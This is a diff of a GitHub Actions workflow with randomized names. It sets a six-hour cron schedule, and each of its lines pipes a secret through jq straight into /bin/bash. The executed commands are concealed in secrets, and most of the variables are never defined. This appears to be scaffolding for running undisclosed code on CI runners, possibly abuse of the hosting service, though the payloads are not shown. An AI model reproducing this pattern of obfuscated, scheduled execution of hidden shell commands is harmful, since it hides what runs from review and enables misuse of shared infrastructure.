@@ -1,8 +1,10 @@
 name: hubinyan2009
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 3/6 * * *'
+    - cron: '14 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,18 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: hubinyan2009
         env:
-          oimvf86: ${{ secrets.oimvf86 }}
+          ng92830: ${{ secrets.ng92830 }}
         run: |
-          echo $oimvf86 | jq -r .msz7347 | /bin/bash
-          echo $u21 | jq -r .bnbbs750 | /bin/bash
-          echo $psod0506 | jq -r .pbts0 | /bin/bash
-          echo $yl61021 | jq -r .d3528 | /bin/bash
-          echo $ajb2996 | jq -r .tm54 | /bin/bash
-          echo $vvf0886 | jq -r .x9 | /bin/bash
-          echo $sy9610 | jq -r .dhtk6556 | /bin/bash
-          echo $x6 | jq -r .fnhor079 | /bin/bash
-          echo $xuq29046 | jq -r .fihks3 | /bin/bash
-          echo $rsz0792 | jq -r .ta09331 | /bin/bash
-          echo $byg4921 | jq -r .bi80698 | /bin/bash
-          echo $at511 | jq -r .pya0 | /bin/bash
+          echo $ng92830 | jq -r .a80 | /bin/bash
+          echo $nyuph16247 | jq -r .ngz62 | /bin/bash
+          echo $ijgwi20944 | jq -r .gzwj23 | /bin/bash
+          echo $cpclx64526 | jq -r .u3 | /bin/bash
+          echo $qgzw331 | jq -r .owkhd7146 | /bin/bash
+          echo $o48 | jq -r .it46007 | /bin/bash
+          echo $j10 | jq -r .uwap3 | /bin/bash
+          echo $nwkml14 | jq -r .yh412 | /bin/bash
 
